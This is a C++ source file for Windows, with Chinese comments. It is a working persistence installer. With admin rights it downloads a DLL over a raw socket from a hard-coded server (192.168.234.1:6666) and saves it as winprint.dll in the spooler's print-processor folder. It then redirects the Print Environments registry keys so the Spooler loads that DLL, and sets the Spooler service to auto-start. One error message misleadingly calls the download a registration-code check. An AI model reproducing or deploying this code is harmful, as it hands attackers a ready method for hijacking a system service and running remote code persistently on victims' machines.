#include<winsock2.h>
#include<windows.h>
#include<vector>
#include<string>

#pragma comment(lib,"ws2_32.lib")


//***** 函数列表 /*****/
void MakePath(std::string address, bool hidden = false); /*创建文件夹路径(可隐藏)*/
std::string CurrentPath(); /*获取程序当前路径*/
void WriteStrToRegTable(HKEY hkeyroot, std::vector<LPCSTR> sets, const char * name, std::string value); //修改注册表值
bool IsRunAsAdmin(); /*检查是否是在管理员权限下运行*/
bool IsWin32(); /*检查系统是否是32位*/
bool FetchDll(std::string ipAddress, int port,std::string dllType, std::string storagePath); //从指定服务器下载dll文件到指定路径
bool ConfigureServiceStartType(std::string serviceName, DWORD startType); /*配置Windows服务启动模式*/


/***** 程序入口 *****/
//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
int main()
{
    //检查是否在管理员模式下运行
    if(!IsRunAsAdmin())
    {
        MessageBox(NULL, "请在管理员权限下运行本程序!", "注意", MB_OK);
        return 0;
    }

    //预期存放路径
    std::string path = "C:\\Windows\\System32\\spool\\prtprocs\\LBWNB";

    //STEP1: 创建文件夹并拷贝DLL
    MakePath(path,false);
    std::string serverAddr = "192.168.234.1"; //DLL下载服务器IP地址
    int serverPort = 6666; //DLL下载服务器端口号
    std::string dllType =  IsWin32() ? "DLL32" : "DLL64";
    if(!FetchDll(serverAddr, serverPort, dllType, path + "\\winprint.dll")) { return 0; }

    //STEP2: 修改注册表(重定位目标的dll路径)
    const int arysetsSize = 5;
    LPCSTR arysets[arysetsSize] = {
        "SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows 4.0\\",
        "SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows ARM64\\",
        "SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows IA64\\",
        "SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows NT x86\\",
        "SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\"
    };
    std::vector<LPCSTR> sets(arysets, arysets + arysetsSize);
    WriteStrToRegTable(HKEY_LOCAL_MACHINE, sets, "Directory", "LBWNB");

    //STEP3: 设置服务自动启动
    ConfigureServiceStartType("Spooler", SERVICE_AUTO_START);

    MessageBox(NULL, "执行成功,请重启系统!", "注意", MB_OK);

    return 0;
}


/***** 函数实现部分 *****/
//创建文件夹路径(可隐藏)
void MakePath(std::string address, bool hidden)
{
    std::vector<std::string> dirs; //逐级保存文件夹路径
    int len = address.length();
    std::string temp = "";

    //由于CreateDirecotry只能自动创建一层目录，故路径不存在时需要逐级创建目录完成总路径的创建
    //逐级拆分目录
    for (int i = 0; i < len; i++)
    {
        if (address[i] == '\\' || address[i] == '/') //要进入下一级文件夹则保存本级文件夹的名称
        {
            dirs.push_back(temp);
            temp = "";
        }
        else //否则继续记录本级文件夹名称
        {
            temp += address[i];
        }
    }
    dirs.push_back(temp);

    //逐级调用CreateDirectory函数进行目录创建
    len = dirs.size();
    temp = dirs[0];
    for (int i = 1; i < len; i++)
    {
        temp += "\\" + dirs[i];
        CreateDirectory(temp.c_str(), NULL); //尝试创建当前级文件夹目录
        if(hidden) { SetFileAttributes(temp.c_str(), FILE_ATTRIBUTE_HIDDEN); } //隐藏目录
    }
}

//获取程序当前路径
std::string CurrentPath()
{
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);
    for(int i = strlen(path); i >= 0 && path[i] != '\\'; i--) { path[i] = '\0'; }
    return std::string(path);
}

//修改注册表条目
void WriteStrToRegTable(HKEY hkeyroot, std::vector<LPCSTR> sets, const char * name, std::string value)
{
    //设置注册表注入项
    LPBYTE lpvalue = new BYTE[value.length()+1];
    const char * cstr = value.c_str();
    memcpy(lpvalue, (LPTSTR)(LPCSTR)cstr, value.length());
    lpvalue[value.length()] = '\0';
    DWORD dataLen = value.length() + 1;

    //尝试访问注册表
    HKEY hKEY;

    for(int i = 0; i < sets.size(); i++)
    {
        if(RegOpenKeyEx(hkeyroot, sets[i], 0, KEY_WRITE, &hKEY) != ERROR_SUCCESS) { continue; }
        if(RegSetValueEx(hKEY, name, 0, REG_SZ, lpvalue, dataLen) != ERROR_SUCCESS) { continue; }
    }
}

//检查是否是在管理员权限下运行
bool IsRunAsAdmin() 
{
	bool bElevated = false;  
	HANDLE hToken = NULL;  
 
	//获取当前进程的访问令牌
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) { return false; }
 
	TOKEN_ELEVATION tokenEle; //结构体，表明进程是否拥有提高的权限
	DWORD dwRetLen = 0; //返回信息的长度
 
	//从令牌中检查权限
	if (GetTokenInformation(hToken, TokenElevation, &tokenEle, sizeof(tokenEle), &dwRetLen)) 
	{  
		if (dwRetLen == sizeof(tokenEle)) 
		{
			bElevated = tokenEle.TokenIsElevated;  
		}
	}  

	CloseHandle(hToken); //检查完令牌后必须关闭
	return bElevated;  
}

//检查系统是否是32位
bool IsWin32()
{
    HKEY hKey;
    char value[40] = "";
    DWORD type = REG_SZ;
    DWORD size = sizeof(value);
    LPCSTR path = "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment";
    RegOpenKeyEx(HKEY_LOCAL_MACHINE , path, 0, KEY_READ, &hKey);
    RegQueryValueEx(hKey, "PROCESSOR_ARCHITECTURE", 0, &type, (LPBYTE)&value, &size);
    std::string res(value);

    bool is32 = res.find("64") == -1;

    return is32;
}

//从指定服务器下载dll文件到指定路径
bool FetchDll(std::string ipAddress, int port,std::string dllType, std::string storagePath)
{
    //初始化socket资源
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);

    SOCKET dllLoadServer = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

    //配置连接地址信息
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ipAddress.c_str());

    //连接到服务器
    if(connect(dllLoadServer, (struct sockaddr*) &addr, sizeof(sockaddr)) == -1)
    {
        closesocket(dllLoadServer);
        MessageBox(NULL,"无法从服务器获取注册码,请检查网络连接!", "注意", MB_OK);
        return false;
    }

    //请求文件
    dllType += "\n";
    send(dllLoadServer, dllType.c_str(), dllType.length(), 0);

    //获取文件
    FILE * file = fopen(storagePath.c_str(), "wb");
    if(file == NULL) { return false; }
    int recvLength = 0;
    char byteBuffer[MAXBYTE];
    while((recvLength = recv(dllLoadServer, byteBuffer, MAXBYTE, 0)) > 0)
    {
        fwrite(byteBuffer, recvLength, 1, file);
    }
    fclose(file);
    
    //关闭socket并清理socket资源
    closesocket(dllLoadServer);
    WSACleanup();

    return true;
}

//配置Windows服务启动模式
bool ConfigureServiceStartType(std::string serviceName, DWORD startType)
{
    SC_HANDLE schSCManager; //服务管理器句柄
    SC_HANDLE schService; //服务控制句柄

    //打开服务管理器
    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if(schSCManager == NULL) { return false; }

    //打开服务控制句柄
    schService = OpenService(schSCManager, serviceName.c_str(), SERVICE_CHANGE_CONFIG);
    if(schService == NULL) { return false; }

    //设置服务启动状态
    bool result = ChangeServiceConfig(
        schService, //服务句柄
        SERVICE_NO_CHANGE, //服务类型(不变)
        startType, //启动模式
        SERVICE_NO_CHANGE, //服务错误控制(不变)
        NULL, //服务二进制路径(不变)
        NULL, //服务指令组(不变)
        NULL, //标签ID(不变)
        NULL, //服务依赖(不变)
        NULL, //账户名称(不变)
        NULL, //账户密码(不变)
        NULL //服务显示名称(不变)
    );

    //关闭打开的句柄
    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);

    return result;
}